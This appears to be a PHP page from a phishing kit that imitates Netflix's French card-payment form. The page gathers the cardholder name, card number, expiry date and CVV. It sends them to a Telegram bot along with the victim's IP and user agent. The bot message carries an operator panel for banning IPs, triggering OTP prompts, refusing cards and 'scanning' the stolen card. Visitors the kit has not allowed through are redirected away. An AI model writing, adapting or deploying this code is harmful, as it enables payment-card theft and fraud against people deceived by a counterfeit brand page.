<?php
session_start();

$config = include 'config.php';
include "functions.php";

$user_ip = $_SERVER['REMOTE_ADDR'];
$user_info = getUserInfo(); 

$city = 'Unknown';
$response = file_get_contents("https://freeipapi.com/api/json/" . $user_ip); 

if ($response !== false) {
   $data = json_decode($response, true);
   
   if (isset($data['cityName'])) {
       $city = $data['cityName'];
   }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $cardholder = isset($_POST['cardholder']) ? htmlspecialchars($_POST['cardholder']) : 'N/A';
    $cardnumber = isset($_POST['cardnumber']) ? htmlspecialchars($_POST['cardnumber']) : 'N/A';
    $expiry = isset($_POST['expiry']) ? htmlspecialchars($_POST['expiry']) : 'N/A';
    $cvv = isset($_POST['cvv']) ? htmlspecialchars($_POST['cvv']) : 'N/A';

    $telegram_message = "
📋 NEW PAYMENT CARD FROM {$country_code}

💳 Card Information:

├ 🧾 Cardholder Name: <code>" . htmlspecialchars($cardholder) . "</code>
├ 💳 Card Number: <code>" . htmlspecialchars($cardnumber) . "</code>
├ 🕑 Expiry Date: <code>" . htmlspecialchars($expiry) . "</code>
└ 🔒 CVV: <code>" . htmlspecialchars($cvv) . "</code>

✨ Extra Information:

├ 🌐 IP Address: <code>{$ip}</code>
└ 💻 Operating System: <code>{$_SESSION['ua']}</code>

🎯 Base Details:

└ 🕒 Timestamp: <code>{$timestamp}</code>
└ 📍 System: <code>NETFLIX</code>
└ © 2025 - All rights reserved. �

[🔗] CorteX - @Sssba3 [🔗]";

$inline_keyboard = array(
    'inline_keyboard' => array(
        array(
            array('text' => '🚫 BAN IP 🚫', 'url' => $base_url . "/zebi/query.php?ip=" . urlencode($ip) . "&" . $stepes['ban']),
            array('text' => '✅ PAGE FINAL ✅', 'url' => $base_url . "/zebi/query.php?ip=" . urlencode($ip) . "&" . $stepes['success']),
        ),
        array(
            array('text' => '📞 LANCER OTP 📞', 'url' => $base_url . "/zebi/query.php?ip=" . urlencode($ip) . "&" . $stepes['sms']),
        ),
        array(
            array('text' => '❌ REFUSER CARTE ❌', 'url' => $base_url . "/zebi/query.php?ip=" . urlencode($ip) . "&" . $stepes['payment-err']),
        )
    )
);

if ($step == "3" && isset($_POST['cardnumber']) && isset($_POST['expiry']) && isset($_POST['cvv']) && isset($_POST['cardholder'])) {
    $inline_keyboard['inline_keyboard'][] = array(
        array(
            'text' => '🛰 SCAN CC 🛰',
            'url' => $base_url . "scan.php?cc-number=" . urlencode($_POST['cardnumber']) .
                    "&cc-exp=" . urlencode($_POST['expiry']) .
                    "&cc-cvv=" . urlencode($_POST['cvv']) .
                    "&fname=" . urlencode($_POST['cardholder'])
        )
    );
}

if (!$Live_panel || $step == "1" || $step == "2") {
    $inline_keyboard = array(
        'inline_keyboard' => array(
            array(
                array('text' => 'Ban ip', 'url' => $base_url . "/zebi/query.php?ip=" . urlencode($ip) . "&" . $stepes['ban']),
            ),
        )
    );
}

sendMessage($telegram_message, $replyMarkup = $inline_keyboard, $replyToMessageId = null);

header("Location: " . $base_url . "/loading2.php?steps=$steps");
exit();



    if (sendMessage($telegram_message)) {
        error_log("Credit card details sent to Telegram successfully.");
    } else {
        error_log("Failed to send credit card details to Telegram.");
    }
    
    $_SESSION['payment_submitted'] = true;


    header('Location: loading2.php'); 
    exit(); 
}

if ($_SESSION['allow'] == "yes") {
?>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Paiement par Carte - Netflix</title>
    <link rel="icon" href="nficon2025.ico">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            margin: 0;
            padding: 0;
            background-color: black; 
            background-image: url('files/img/back.jpg');
            background-repeat: no-repeat;
            background-position: center center;
            background-attachment: fixed;
            background-size: cover;
            font-family: 'Arial', sans-serif;
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .logo {
            text-align: center;
            padding: 30px 0 10px;
        }

        .form-container {
            background-color: rgba(0, 0, 0, 0.75);
            max-width: 450px;
            margin: 20px auto 40px;
            padding: 30px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.6);
            text-align: left;
        }

        .form-container h2 {
            font-size: 16px;
            font-weight: normal;
            text-align: center;
            margin-bottom: 25px;
			margin-top: 20px;
            position: relative;
            padding-top: 50px;
        }

        input[type="text"],
        input[type="tel"],
        input[type="number"] {
            display: block;
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #444;
            border-radius: 2px;
            background-color: #111;
            color: #fff;
            font-size: 16px;
        }

        input::placeholder {
            color: #bbb;
        }

        .card-fields {
            display: flex;
            gap: 10px;
            margin-bottom: 10px;
        }

        .card-fields input {
            flex: 1;
        }

        .card-icons {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 15px 0;
        }

        .card-icons img {
            height: 28px;
            filter: grayscale(100%);
            opacity: 0.6;
            transition: all 0.3s ease;
        }

        .card-icons img.active {
            filter: none;
            opacity: 1;
        }

        button {
            width: 100%;
            background-color: #e50914;
            color: white;
            border: none;
            padding: 14px;
            font-size: 16px;
            margin-top: 10px;
			margin-bottom: -10px;
            cursor: pointer;
            border-radius: 2px;
            font-weight: bold;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #f40612;
        }

        .footer {
            background-color: rgba(0, 0, 0, 0.8);
            color: #ccc;
            padding: 30px 20px;
            font-size: 13px;
            margin-top: auto;
        }

        .footer a {
            color: #ccc;
            text-decoration: none;
            margin: 0 10px;
            white-space: nowrap;
        }

        .footer-top {
            text-align: center;
            margin-bottom: 15px;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
        }

        .footer select {
            background-color: #111;
            color: #ccc;
            border: 1px solid #444;
            padding: 5px;
        }

        .security-note {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-top: 15px;
            font-size: 12px;
            color: #8c8c8c;
        }

        .security-note svg {
            width: 16px;
            height: 16px;
            fill: #8c8c8c;
        }

        @media (max-width: 480px) {
            .form-container {
                margin: 10px;
                padding: 20px;
            }
            
            .card-fields {
                flex-direction: column;
                gap: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="logo"></div>
    
    <div class="form-container">
    <div style="text-align: center; line-height: 0; margin-bottom: -10px;">
        <img src="logo.png" alt="Netflix Logo" style="height: 100px; display: inline-block; vertical-align: bottom; margin-bottom: -10px;">
    </div>
    <h2 style="margin-top: 0; font-weight: bold; text-align: center;">Paiement par carte</h2>

        
        <form action="" method="post">
            <input type="text" name="cardholder" placeholder="Titulaire de la carte" required>
            
            <input type="text" name="cardnumber" placeholder="Numéro de carte" required maxlength="19">
            
            
            <div class="card-fields">
                <input type="text" name="expiry" placeholder="MM/AA" required maxlength="5">
                <input type="text" name="cvv" placeholder="CVV" required maxlength="4">
            </div>
			
			<div class="card-icons">
                <img src="vs.svg" alt="Visa">
                <img src="mr.svg" alt="Mastercard">
                <img src="am.svg" alt="Amex">
            </div>
            
            <div class="security-note">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
                </svg>
                <span>Vos informations de paiement sont sécurisées</span>
            </div>
            
            <button type="submit">Valider Mon Paiement</button>
        </form>
    </div>
    
    <div class="footer">
        <div class="footer-top">Des questions ? Contactez-nous.</div>
        <div class="footer-links">
            <a href="">FAQ</a>
            <a href="">Centre d'aide</a>
            <a href="">Boutique Netflix</a>
            <a href="">Conditions d'utilisation</a>
            <a href="">Confidentialité</a>
            <a href="">Préférences de cookies</a>
            <a href="">Mentions légales</a>
            <a href="">Choix liés à la pub</a>
        </div>
        <div style="text-align: center;">
            <select>
                <option>Français</option>
            </select>
        </div>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const cardNumberInput = document.querySelector('input[name="cardnumber"]');
            cardNumberInput.addEventListener('input', function() {
                let value = this.value.replace(/\D/g, '');
                value = value.replace(/(\d{4})/g, '$1 ').trim();
                this.value = value.substring(0, 19);
            });
            
            const expiryInput = document.querySelector('input[name="expiry"]');
            expiryInput.addEventListener('input', function() {
                let value = this.value.replace(/\D/g, '');
                if (value.length > 2) {
                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
                }
                this.value = value.substring(0, 5);
            });
            
            const cardIcons = document.querySelectorAll('.card-icons img');
            cardIcons.forEach(icon => {
                icon.addEventListener('mouseover', function() {
                    this.classList.add('active');
                });
                
                icon.addEventListener('mouseout', function() {
                    this.classList.remove('active');
                });
            });
        });
    </script>
</body>
</html>
<?php
} else {
  header('location: https://google.com/404');
  exit();
}
?>
